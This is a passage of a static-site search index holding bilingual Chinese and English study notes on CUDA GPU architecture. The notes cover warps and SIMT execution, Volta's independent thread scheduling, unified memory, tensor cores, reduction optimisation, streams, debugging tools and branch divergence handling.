<li>\u7ebf\u7a0b\u5757\u7684\u5212\u5206\u5f88\u7b80\u5355\uff0c\u8fde\u7eed\u7684\u7ebf\u7a0b\u88ab\u5212\u5206\u5728\u4e00\u8d77\u3002The way a block is partitioned into warps is always the same; each warp contains threads of consecutive, increasing thread IDs with the first warp containing thread 0.</li> <li>warp \u4e2d\u7684\u7ebf\u7a0b\u4ece\u76f8\u540c\u5730\u5740\u5f00\u59cb\u6267\u884c\uff0c\u5982\u679c\u7ebf\u7a0b\u56e0\u4e3a\u6570\u636e\u76f8\u5173\u7684\u5206\u652f\u9020\u6210\u5206\u53c9\uff0cwarp \u6267\u884c\u6bcf\u4e00\u6761\u4ee3\u7801\u8def\u5f84\uff0c\u540c\u65f6\u7981\u6b62\u975e\u8be5\u4ee3\u7801\u8def\u5f84\u4e0a\u7684\u7ebf\u7a0b\u3002A warp executes one common instruction at a time. ... If threads of a warp diverge via a data-dependent conditional branch, the warp executes each branch path taken, disabling threads that are not on that path.</li> <li>\u5206\u53c9\u53ea\u53d1\u751f\u5728 warp \u5185\uff0c\u4e0d\u540c warp \u662f\u72ec\u7acb\u7684\u3002Branch divergence occurs only within a warp; different warps execute independently regardless of whether they are executing common or disjoint code paths.</li> </ul> <ul> <li>GPU \u7684 SIMT \u548c SIMD \u6709\u70b9\u7c7b\u4f3c\uff0c\u90fd\u662f\u5355\u6761\u6307\u4ee4\u5904\u7406\u591a\u4e2a\u6570\u636e\u3002The SIMT architecture is akin to SIMD (Single Instruction, Multiple Data) vector organizations in that a single instruction controls multiple processing elements.<ul> <li>\u5173\u952e\u7684\u4e0d\u540c\u5728\u4e8e\uff0cSIMT \u65e2\u53ef\u4ee5\u5b9e\u73b0\u7ebf\u7a0b\u7ea7\u5e76\u884c\uff08\u5bf9\u4e8e\u72ec\u7acb\u7684\u6807\u91cf\u7ebf\u7a0b\uff09\uff0c\u53c8\u53ef\u4ee5\u5b9e\u73b0\u6570\u636e\u7ea7\u5e76\u884c\uff08\u5bf9\u4e8e\u5408\u4f5c\u7ebf\u7a0b\uff09\u3002SIMT enables programmers to write thread-level parallel code for independent, scalar threads, as well as data-parallel code for coordinated threads.</li> </ul> </li> </ul> <ul> <li>volta \u4e4b\u524d\u7684\u67b6\u6784\uff0cwarp \u5185 32 \u4e2a\u7ebf\u7a0b\u516c\u7528\u76f8\u540c\u7684 PC\u3002\u5bfc\u81f4\u5206\u53c9\u8def\u5f84\u4e0a\u7684\u7ebf\u7a0b\u65e0\u6cd5\u76f8\u4e92\u901a\u4fe1\u3002Prior to NVIDIA Volta, warps used a single program counter shared amongst all 32 threads in the warp together with an active mask specifying the active threads of the warp. As a result, threads from the same warp in divergent regions or different states of execution cannot signal each other or exchange data, and algorithms requiring fine-grained sharing of data guarded by locks or mutexes can easily lead to deadlock, depending on which warp the contending threads come from.</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#hardware-multithreading","title":"Hardware Multithreading","text":"<ul> <li>\u6267\u884c\u4e0a\u4e0b\u6587\u5305\u542b PC\uff0c\u5bc4\u5b58\u5668\u3002warp \u4e0a\u4e0b\u6587\u88ab\u4fdd\u5b58\u5728\u7247\u4e0a\uff08\u800c\u4e0d\u662f\u8f6f\u4ef6\u4fdd\u5b58\uff09\uff0c\u56e0\u6b64 warp \u5207\u6362\u6ca1\u6709\u635f\u5931\u3002The execution context (program counters, registers, and so on) for each warp processed by a multiprocessor is maintained on-chip during the entire lifetime of the warp. Therefore, switching from one execution context to another has no cost,</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#shared-memory-or-cache-","title":"Shared memory or cache ?","text":"<p>Is it possible to use L1 cache instead of shared memory when implementing blocked matmuls in CUDA - CUDA / CUDA Programming and Performance - NVIDIA Developer Forums</p> <p>\u8d77\u521d\u6ca1\u6709 L1/L2 --&gt; \u5f15\u5165 scratch pad --&gt; cache \u8d8a\u6765\u8d8a\u5927</p> <p>I think it is fair to say that the importance of shared memory in CUDA programming has decreased with the advent of L1/L2 caches of competitive size in GPUs. For use cases requiring peak performance, shared memory can still be important due to the programmer control it provides.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#tensor-core","title":"tensor core","text":"<p>v100 whitepaper</p> <p>The Volta tensor cores are accessible and exposed as Warp-Level Matrix Operations in the CUDA 9 C++ API. The API exposes specialized matrix load, matrix multiply and accumulate, and matrix store operations to efficiently use Tensor Cores from a CUDA-C++ program. At the CUDA level, the warp-level interface assumes 16x16 size matrices spanning all 32 threads of the warp. In addition to CUDA-C++ interfaces to program Tensor Cores directly, cuBLAS and cuDNN libraries have been updated to provide new library interfaces to make use of Tensor Cores for deep learning applications and frameworks. NVIDIA has worked with many popular deep learning frameworks such as Caffe2 and MXNet to enable use of Tensor Cores for deep learning research on Volta GPU based systems. NVIDIA is working to add support for Tensor Cores in other frameworks as well.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#aaa","title":"aaa","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#unified-memory","title":"unified memory","text":"<p>Beyond GPU Memory Limits with Unified Memory on Pascal | NVIDIA Technical Blog</p> <p>\u80cc\u666f</p> <ul> <li>\u4e24\u4e2a memory space</li> <li>\u5e94\u7528\u4e0d\u80fd oversubscribing GPU \u5185\u5b58\uff0c\u5f00\u53d1\u8005\u5fc5\u987b\u624b\u52a8\u7ba1\u7406 active working set</li> <li>\u53cc\u3001\u56db\u548c\u516b GPU \u7cfb\u7edf\u5728\u5de5\u4f5c\u7ad9\u548c\u5927\u578b\u8d85\u7ea7\u8ba1\u7b97\u673a\u4e2d\u53d8\u5f97\u8d8a\u6765\u8d8a\u666e\u904d\uff0c\u5728 CPU \u548c GPU \u4e4b\u95f4\u624b\u52a8\u7ba1\u7406\u6570\u636e\u5f88\u56f0\u96be</li> <li>\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u57fa\u672c\u65e0\u6cd5\u624b\u52a8\u7ba1\u7406\uff1a\u5149\u7ebf\u8ffd\u8e2a\u5f15\u64ce\u53d1\u5c04\u7684\u5149\u7ebf\u53ef\u4ee5\u6839\u636e\u6750\u6599\u8868\u9762\u5411\u4efb\u4f55\u65b9\u5411\u53cd\u5f39\u3002\u5982\u679c\u573a\u666f\u4e0d\u9002\u5408 GPU \u5185\u5b58\uff0c\u5149\u7ebf\u53ef\u80fd\u5f88\u5bb9\u6613\u51fb\u4e2d\u4e0d\u53ef\u7528\u7684\u8868\u9762\uff0c\u5fc5\u987b\u4ece CPU \u5185\u5b58\u4e2d\u83b7\u53d6\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6ca1\u6709\u771f\u6b63\u7684 GPU \u9875\u9762\u6545\u969c\u529f\u80fd\uff0c\u51e0\u4e4e\u4e0d\u53ef\u80fd\u8ba1\u7b97\u51fa\u54ea\u4e9b\u9875\u9762\u5e94\u8be5\u5728\u4ec0\u4e48\u65f6\u95f4\u8fc1\u79fb\u5230 GPU \u5185\u5b58\u3002</li> </ul> <p>\u7279\u70b9</p> <ul> <li>\u7edf\u4e00\u5185\u5b58\u4e8e 2014 \u5e74\u968f CUDA 6 \u548c Kepler \u67b6\u6784\u4e00\u8d77\u63a8\u51fa\u3002\u8fd9\u79cd\u76f8\u5bf9\u8f83\u65b0\u7684\u7f16\u7a0b\u6a21\u578b\u5141\u8bb8 GPU \u5e94\u7528\u7a0b\u5e8f\u5728 CPU \u51fd\u6570\u548c GPU \u5185\u6838\u4e2d\u4f7f\u7528\u5355\u4e2a\u6307\u9488\uff0c\u4ece\u800c\u5927\u5927\u7b80\u5316\u4e86\u5185\u5b58\u7ba1\u7406\u3002</li> <li>CUDA 8 \u548c Pascal \u67b6\u6784\u901a\u8fc7\u6dfb\u52a0 49 \u4f4d\u865a\u62df\u5bfb\u5740\u548c\u6309\u9700\u9875\u9762\u8fc1\u79fb (on-demand page migration)\uff0c\u663e\u8457\u6539\u8fdb\u4e86\u7edf\u4e00\u5185\u5b58\u529f\u80fd\u3002<ul> <li>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5b9e\u73b0\u4e86 page fault\u3002The Page Migration engine allows GPU threads to fault on non-resident memory accesses so the system can migrate pages from anywhere in the system to the GPUs memory on-demand for efficient processing.</li> </ul> </li> <li>CUDA 8 \u8fd8\u6dfb\u52a0\u4e86\u901a\u8fc7\u5411\u8fd0\u884c\u65f6\u63d0\u4f9b\u63d0\u793a\u6765\u4f18\u5316\u6570\u636e\u5c40\u90e8\u6027\u7684\u65b0\u65b9\u6cd5\uff0c\u56e0\u6b64\u4ecd\u7136\u53ef\u4ee5\u5b8c\u5168\u63a7\u5236\u6570\u636e\u8fc1\u79fb\u3002</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#memory-space","title":"memory space","text":"<p>local global co</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#cuda-and-applications-to-task-based-programming","title":"CUDA and Applications to Task-based Programming","text":"<p>CUDA and Applications to Task-based Programming (cuda-tutorial.github.io)</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#part1-\u7f16\u7a0b\u6a21\u578b","title":"part1 \u7f16\u7a0b\u6a21\u578b","text":"<ul> <li>CPU latency-oritened<ul> <li>large L1</li> <li>ILP</li> </ul> </li> <li>GPU througput-oriented<ul> <li>vast number of parallel processors</li> <li>over-subscribe, latency hiding</li> </ul> </li> <li>CUDA: Compute Unified Device Architecture<ul> <li>driver API: cu</li> <li>runtime API: cuda</li> <li>device runtime API</li> <li>driver API is superset of runtime API, provide a few additional advanced features.</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u6709\u7528\u7684\u53c2\u8003\u8d44\u6599","title":"\u6709\u7528\u7684\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Essential reading<ul> <li>CUDA Programming Guide</li> <li>CUDA API Reference Manual</li> <li>PTX Instruction Set Architecture</li> </ul> </li> <li>Building executables<ul> <li>CUDA Compiler Driver NVCC</li> </ul> </li> <li>Debugging &amp; profiling<ul> <li>CUDA-MEMCHECK</li> <li>Nsight Documentatio</li> </ul> </li> </ul> <p><code>__global__</code>: be invoked straight from the host and must not have a return value other than void.</p> <ul> <li>Launch configuration, parameters (built-in types, structs, pointers) <code>__device__</code>: be called from functions already running on the device, such as kernels or other device functions. <code>__host__</code>: \u4fee\u9970\u8fd0\u884c\u5728 CPU \u4e0a\u7684\u51fd\u6570</li> <li>\u540c\u65f6\u6307\u5b9a device \u548c host\uff0c\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u4e00\u4e9b\u67b6\u6784\u65e0\u5173\u7684\u51fd\u6570</li> </ul> <p>\u540c\u6b65</p> <ul> <li>kernel call \u5bf9\u4e8e host \u662f\u5f02\u6b65\u7684\uff0c\u7136\u800c kernel call \u4e4b\u95f4\u9ed8\u8ba4\u4e0d\u662f\u5f02\u6b65\u7684\uff0c\u56e0\u6b64 cuda \u9ed8\u8ba4\u5047\u8bbe\u8fde\u7eed\u7684 kernel calls or copy instructions are dependent on previous events, and order them accordingly\u3002</li> <li>\u540c\u6b65\u547d\u4ee4<ul> <li>cudaDeviceSynchronize() to synchronize CPU and GPU</li> <li>cudaEventSynchronize() to synchronize up to certain event</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u8fd0\u884c","title":"\u8fd0\u884c","text":"<p>\u4f7f\u7528 warp \u7684\u539f\u56e0\uff0c\u4e3a\u4e86\u5229\u7528 SIMD \u5355\u5143 For the sake of exploiting SIMD hardware units, threads will always execute in groups of 32, regardless of the block size being used.</p> <p>volta \u6539\u8fdb\u4e86 warp\uff08\u5355\u72ec PC\uff09 Before Volta: not understanding warps may crash your application After Volta: not caring about warps may make your application slower</p> <p>SM</p> <ul> <li>cuda core: synonym for the units that perform integer or floating-point arithmetic</li> <li>LD/ST</li> <li>SFU</li> <li>tensor core</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#warp-\u6267\u884c\u6a21\u578b","title":"warp \u6267\u884c\u6a21\u578b","text":"<p>block queue</p> <ul> <li>the blocks that make up a grid are committed to the GPU in a block queue.</li> <li>GPU will then proceed to process the blocks in parallel. The degree of parallelisms depends on the hardware being used but is transparent to the developer: block \u88ab\u5b8c\u5168\u5206\u914d\u7ed9\u4e00\u4e2a SM \u4e00\u4e2a SM \u53ef\u4ee5\u8fd0\u884c\u591a\u4e2a block</li> <li>\u5982\u4f55\u8003\u8651 shared memory \u7684\u5171\u4eab\uff1f SM \u9009\u62e9 ready \u7684 warp \u6267\u884c\uff0c</li> <li>SM \u7684 warp \u8d8a\u591a\uff0c\u5e76\u884c\u6548\u7387\u8d8a\u9ad8\uff1fThe more warps an SM has to choose from, the higher the chances are that it can hide latency by switching to different warps.</li> </ul> <p>warp \u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u6267\u884c\uff0cwarp \u4e2d\u7684\u7ebf\u7a0b\u540c\u65f6\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4</p> <ul> <li>\u7ebf\u7a0b\u53ef\u4ee5\u5206\u53c9\uff08diverged\uff09</li> </ul> <p></p> <p>SIMT \u6b63\u5f0f\u89e3\u91ca\uff1a\u65e2\u53ef\u4ee5\u770b\u4f5c\u5355\u72ec\u7684\u7ebf\u7a0b\uff0c\u53c8\u53ef\u4ee5\u50cf SIMD \u4e00\u6837\u9ad8\u6548\uff08\u53ea\u8981\u4e0d\u5206\u53c9\uff09</p> <ul> <li>\u6bcf\u4e2a\u7ebf\u7a0b\u6709\u4e00\u4e2a active flag \u63a7\u5236\u662f\u5426\u53c2\u4e0e warp \u5185\u7684\u8ba1\u7b97 This architecture design, which enables threads to behave like individual entities, while still enabling the exploitation of efficient SIMD operations when threads are not diverged is described by the term \u201csame-instruction-multiple-threads\u201d, or SIMT for short.</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#cuda-thread-execution-model","title":"CUDA thread execution model","text":"<ul> <li>Legacy Thread Scheduling</li> <li>Independent Thread Scheduling (ITS)</li> </ul> <p>legacy(\u201clockstep\u201d)</p> <ul> <li>warp \u53ea\u6709\u4e00\u4e2a PC \u503c<ul> <li>warp \u4e2d\u7684\u6240\u6709\u7ebf\u7a0b\u5728\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u90fd\u6267\u884c\u76f8\u540c\u7684\u6307\u4ee4</li> </ul> </li> <li>inactive will not execute current instruction</li> <li>diverges \u65f6\uff0c\u5148\u6267\u884c\u4e00\u90e8\u5206\uff0c\u518d\u6267\u884c\u53e6\u4e00\u90e8\u5206</li> <li>\u5728 warp \u5207\u6362\u524d\uff0c\u4f1a\u5c1d\u8bd5\u8fbe\u5230\u5408\u5e76\u70b9\u3002Diverged threads will try to reach convergence point before switching</li> <li>\u4f4d\u4e8e\u5206\u53c9\u7684\u4e24\u90e8\u5206\u7684\u7ebf\u7a0b\uff0c\u4e0d\u80fd\u5b9e\u73b0\u4e00\u4e9b\u540c\u6b65\u7b97\u6cd5\uff0c\u5bb9\u6613\u9020\u6210\u6b7b\u9501 </li> </ul> <p>ITS(Independent Thread Scheduling)</p> <ul> <li>Two registers reserved, each thread gets its own program counter</li> <li>\u7ebf\u7a0b\u7684\u6267\u884c\u4ecd\u7136\u53d1\u751f\u5728 warp\uff0cIt is not possible for threads in a warp to perform different instructions in the same cycle<ul> <li>\u4e5f\u5c31\u662f\u8bf4\u4ecd\u7136\u65e0\u6cd5\u4e00\u8d77\u6267\u884c A \u548c B</li> </ul> </li> <li>ITS provides a \u201cprogress guarantee\u201d: eventually, over a number of cycles, all individual program counters that the threads in a warp maintain will be visited</li> <li>they are free to stay diverged until the program finishes. The GPU will try to make threads reconverge at opportune times,</li> <li>\u901a\u8fc7\u663e\u793a\u7684\u540c\u6b65\u6307\u4ee4\u4fdd\u8bc1\u6240\u6709\u7ebf\u7a0b\u6267\u884c\u76f8\u540c\u7684\u6307\u4ee4\u3002synchronization command</li> </ul> <p></p> <p><code>__syncwarp</code></p> <ul> <li>\u53ea\u5bf9 volta \u4e4b\u540e\u7684\u67b6\u6784\u6709\u610f\u4e49\uff08\u652f\u6301 ITS\uff09</li> <li>\u53ef\u4ee5\u901a\u8fc7 mask \u53ea\u540c\u6b65\u4e00\u4e2a\u5b50\u96c6\u7ebf\u7a0b\u300232bit integer, where each bit indicates whether or not a thread with the corresponding ID should participate in the synchronization.</li> </ul> <p><code>__syncthreads()</code></p> <ul> <li>All active threads must reach the same instruction in the program</li> </ul> <p><code>this_grid().sync()</code> can busy-wait to synchronize entire kernel</p> <p>\u6b63\u5e38\u6765\u8bf4\uff0cCUDA \u7f16\u7a0b\u8303\u5f0f\uff08programming paradigm\uff09\u5305\u542b grid-block-thread \u4e09\u5c42\u3002\u4f46\u662f\u7531\u4e8e\u7ebf\u7a0b\u662f\u6309\u7167 warp \u8c03\u5ea6\u7684\uff0c\u56e0\u6b64\u6b63\u786e\u5229\u7528 warp \u7684\u6027\u8d28\u53ef\u4ee5\u6781\u5927\u63d0\u9ad8\u6027\u80fd\u3002</p> <p>Warp-level primitives are instructions where threads in one warp exploit the fact that they run together to quickly share information</p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#reduce-\u4f18\u5316\u4f8b\u5b50","title":"reduce \u4f18\u5316\u4f8b\u5b50","text":"<p>1 reduce global</p> <ul> <li>N \u6b21 read, store global memory</li> <li>read \u4f1a\u7ecf\u8fc7 cache\uff0c\u90a3\u4e48\u5176\u5b83 sm \u8bfb\u53d6\u7684\u65f6\u5019\u4f1a\u53cd\u590d\u51fa\u73b0 invalid cache \u7684\u60c5\u51b5\u5417\uff1f </li> </ul> <p>2 reduce shared</p> <ul> <li>\u4f7f\u7528 shared \u5feb\u901f\u7684\u5185\u5b58\u7d2f\u52a0</li> <li>\u5c06\u64cd\u4f5c global memory \u964d\u4f4e\u4e3a N/256 </li> </ul> <p>\u524d\u9762\u7684\u5747\u662f\u987a\u5e8f\u89c4\u7ea6\uff0c\u53ef\u4ee5\u4f7f\u7528 subliner \u7684\u7b97\u6cd5 3 </p> <p>4</p> <ul> <li>\u4f7f\u7528\u5bc4\u5b58\u5668\u505a\u6700\u540e 32 \u4e2a\u6570\u636e\u7684\u89c4\u7ea6<ul> <li>In the first iteration, each thread in the warp will try to read the value of the thread with an ID that is 16 higher than its own. </li> </ul> </li> </ul> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#stream","title":"stream","text":"<p>CUDA will assume that kernels depend on each other unless indicated otherwise.</p> <p>stream</p> <ul> <li>stream \u4e4b\u95f4\u6ca1\u6709\u4f9d\u8d56</li> <li>launch \u65f6\u901a\u8fc7\u7b2c 4 \u4e2a\u53c2\u6570\u6307\u5b9a stream\uff0c\u9ed8\u8ba4\u4e3a\u201cnull\u201dstream<ul> <li>\u8c03\u7528 CUDA runtime API \u65f6\uff0c\u4f20\u9012 stream \u53c2\u6570\u3002\u5982 cudaMemcpyAsync</li> </ul> </li> </ul> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#debug","title":"debug","text":"<p>nsight vscode plugin: Nsight Visual Studio Code Edition</p> <ul> <li>Overview reveals warps, active and valid masks of individual threads</li> </ul> <p>cuda-memcheck suit <code>cuda-memcheck \u2013-tool &lt;tool&gt; &lt;application&gt;</code> \u2022 memcheck: memory errors (access violations, leaks, API errors) \u2022 synccheck: misuse of synchronization (invalid masks, conditions) \u2022 racecheck: data races (read-after-write, write-after-read hazards) \u2022 initcheck: evaluation of uninitialized values (global memory only</p> <ul> <li>CUB/Thrust: additional primitives and functions similar to standard library<ul> <li>Algorithms: e.g., prefix sum, scan, sort   \u2022 Data structures and containers: e.g., vectors</li> </ul> </li> <li>cuBLAS: basic linear algebra subprograms (BLAS) on top of CUDA</li> <li>cuFFT: efficient implementation of discrete fourier transform on the GPU</li> <li>cuSparse: algorithms and optimizations for working with sparse matrices</li> <li>TensorRT: interface to learning and inference capabilities with tensor cores</li> <li>CUTLASS: provides a range of templates for tensor core matrix computations</li> </ul> <p>Compiler Explorer (godbolt.org)</p> <ul> <li>\u652f\u6301 cuda c++</li> <li>\u652f\u6301 PTX \u548c SASS</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#part-2-hardware-\u5b9e\u73b0","title":"part 2 hardware \u5b9e\u73b0","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7f16\u8bd1","title":"\u7f16\u8bd1","text":"<p>host \u548c device \u90e8\u5206\u5206\u5f00\u7f16\u8bd1</p> <p>host code</p> <ul> <li>takes care of loading matching GPU binary stored in .exe</li> <li>translate kernel<code>&lt;&lt;&lt;\u2026&gt;&gt;&gt;(\u2026)</code> syntax into API call</li> </ul> <p>\u201cFat Binary\u201d can contain both</p> <ul> <li>PTX for various compute capabilities<ul> <li>allows the binary to target unknown architecture</li> </ul> </li> <li>precompiled machine code for specific GPU architectures<ul> <li>optimal performance on certain known devices</li> </ul> </li> </ul> <p>PTX</p> <ul> <li>\u751f\u6210\u673a\u5668\u7801<ul> <li>ptxas</li> <li>driver at runtime(JIT)</li> </ul> </li> </ul> <p>SASS(Shader Assembly?)</p> <ul> <li>nvdisasm.exe</li> <li>\u6ca1\u6709\u6587\u6863</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u786c\u4ef6\u8bbe\u8ba1","title":"\u786c\u4ef6\u8bbe\u8ba1","text":"<ul> <li>GPU \u8bbe\u8ba1\u6210\u6700\u5927\u5316\u541e\u5410\u91cf</li> <li>\u4e0d\u7b49\u5f85\u957f\u5ef6\u8fdf\u64cd\u4f5c\uff0c\u800c\u662f\u5207\u6362\u5230\u5176\u5b83\u4efb\u52a1</li> </ul> <p>\u8bbe\u8ba1\u5bf9\u6bd4 </p> <p>CPU\uff1a\u4f18\u5316 single flow \u901f\u5ea6</p> <ul> <li>larget cache</li> <li>complex control logic for out-of-order execution</li> </ul> <p>GPU</p> <ul> <li>simple control</li> <li>many core</li> <li>large register<ul> <li>keep context resident on chip, enable rapidly switch</li> </ul> </li> <li>rely on SIMD<ul> <li>Each control logic is associated with multiple arithmetic logic units (ALUs), allowing for the parallel execution of multiple control flows</li> </ul> </li> </ul> <p>two-level hierarchy that consists of groups of groups of SIMD cores.</p> <ul> <li>GPU<ul> <li>SM<ul> <li>warp scheduler<ul> <li>register file</li> <li>a set of ALU: INT32, FP32, FP64, Tensor Core, LD/ST unit, SFU</li> </ul> </li> <li>shared memory</li> <li>L1 cache</li> </ul> </li> </ul> </li> </ul> <p>each warp scheduler is assigned a set of warps to execute</p> <ul> <li>The execution context of all threads that are part of each warp is kept locally in the register file associated with the warp scheduler responsible for the warp</li> </ul> <p>Whenever it could issue a new instruction (e.g., each clock cycle unless all of the necessary resources are occupied), the warp scheduler will pick the next instruction from one of its warps that are ready to run (i.e., not waiting on the result of a previous operation) and schedule it to the appropriate hardware unit.</p> <ul> <li>\u5355\u53d1\u5c04\uff1f</li> <li>\u770b\u6765\u65f6 SIMD \u5f62\u5f0f\u53d1\u5c04</li> </ul> <p>warp \u5207\u6362\u9690\u85cf\u5ef6\u8fdf\uff0cwarp scheduler \u4ece reay \u7684 warp \u4e2d\u9009\u62e9\u4e00\u4e2a\u6267\u884c\u5176\u6307\u4ee4\uff08\u5047\u8bbe SIMD\uff09\uff0c\u9047\u5230\u8bbf\u5b58\u6307\u4ee4\uff0c\u5982\u679c\u4e0b\u4e00\u6761\u6307\u4ee4\u4f9d\u8d56\u8bbf\u5b58\u6307\u4ee4\u6570\u636e\uff0c\u5219\u5c06 warp \u7f6e\u4e8e suspend queue\u3002\u7136\u540e\u5207\u6362\u5230\u53e6\u4e00\u4e2a ready warp\u3002\u56e0\u6b64\u53ea\u8981\u4e00\u76f4\u80fd\u5207\u6362 warp\uff0c\u8bbf\u5b58\u5ef6\u8fdf\u5c31\u53ef\u4ee5\u88ab\u9690\u85cf\u3002</p> <p>So far, we have simply assumed that all threads within a warp always need to run the same instruction next, allowing us to execute all threads of a warp in parallel in SIMD fashion</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#warp-\u5b9e\u73b0","title":"warp \u5b9e\u73b0","text":"<p>\u5bf9\u4e8e diverge \u7684\u5904\u7406\uff0c\u5c5e\u4e8e\u731c\u6d4b</p> <p>predication</p> <ul> <li>\u6307\u4ee4\u901a\u8fc7 1bit prediction\uff0c\u6765\u51b3\u5b9a\u662f\u5426\u6267\u884c</li> <li>\u7a0b\u5e8f\u4e00\u76f4\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4\uff0c\u6709\u4e00\u4e9b\u5206\u652f\u7684 EXIT \u6307\u4ee4\u5728 pred \u7684\u4f5c\u7528\u4e0b\u751f\u6548\uff0c\u907f\u514d\u6267\u884c\u5176\u5b83\u5206\u652f\u7684\u4ee3\u7801</li> <li>\u7f3a\u70b9\uff1a<ul> <li>However, control flow is forced to pass over all instructions on both sides of every branch<ul> <li>\u6709\u4e9b branch\uff0c\u6ca1\u6709\u7ebf\u7a0b\u6267\u884c\u3002\u4ecd\u7136\u8981\u904d\u5386\u6240\u6709 path\uff0c\u5bfc\u81f4 significant overhead especially as branches are nested more and more deeply</li> </ul> </li> </ul> </li> <li>\u5bf9\u4e8e\u66f4\u590d\u6742\u7684\u63a7\u5236\uff0c\u6bd4\u5982\u51fd\u6570\u8c03\u7528\uff0c\u65e0\u6cd5\u5b9e\u73b0</li> </ul> <p>\u5148\u6267\u884c\u4e00\u90e8\u5206\uff0c\u518d\u6267\u884c\u53e6\u4e00\u90e8\u5206\uff0c\u6700\u540e\u5408\u5e76\u3002</p> <ul> <li>\u5982\u4f55\u51b3\u5b9a\u6267\u884c\u987a\u5e8f\u5462\uff1f<ul> <li>\u987a\u5e8f\u6267\u884c\uff0c\u4fdd\u8bc1\u80fd\u904d\u5386\u5230\u6240\u6709\u5206\u652f</li> </ul> </li> <li>\u66f4\u590d\u6742\u7684\u60c5\u51b5\uff1f<ul> <li>\u5d4c\u5957\u5faa\u73af</li> <li>\u5fc5\u987b\u904d\u5386\u5b8c\u6240\u6709\u5206\u652f\uff08\u5373\u4f7f\u6ca1\u6709\u7ebf\u7a0b\u6267\u884c\uff09</li> <li>\u4f7f\u7528 CSR \u6808</li> </ul> </li> </ul> <p></p> <p>CSR(Call, Return, Synchronization)</p> <ul> <li>warp \u8c03\u5ea6\u5668\u7ef4\u62a4\u4e00\u4e2a\u6808\uff1amask(32bit)\uff0c\u5408\u5e76\u70b9</li> <li>\u9047\u5230\u5206\u652f\u6307\u4ee4\u65f6\uff0c\u5c06\u4e00\u4e2a\u5206\u652f\u7684 mask \u548c\u5408\u5e76\u70b9 push \u5230 stack\uff0c\u7136\u540e\u6267\u884c\u53e6\u4e00\u4e2a\u5206\u652f (~mask)\uff0c\u7ed3\u675f\u65f6 sync\uff0c\u4ece stack \u4e2d pop \u6062\u590d</li> </ul> <p>CUDA and Application to Task-Based Programming (part 1) | Eurographics'2021 Tutorial (youtube.com)</p> <ul> <li>2:17:30\uff0c\u89e3\u91ca CSR</li> </ul> <p>ITS</p> <ul> <li>Instead of just scheduling warps as a whole, the warp scheduler can switch between active branches of warps. While execution of divergent branches still has to be serialized, it can be interleaved<ul> <li>\u8c03\u5ea6\u7684\u5355\u4f4d\u4ece warp \u53d8\u4e3a\u4e86 branch</li> </ul> </li> <li>\u6d88\u9664\u4e86 intra-warp synchronization 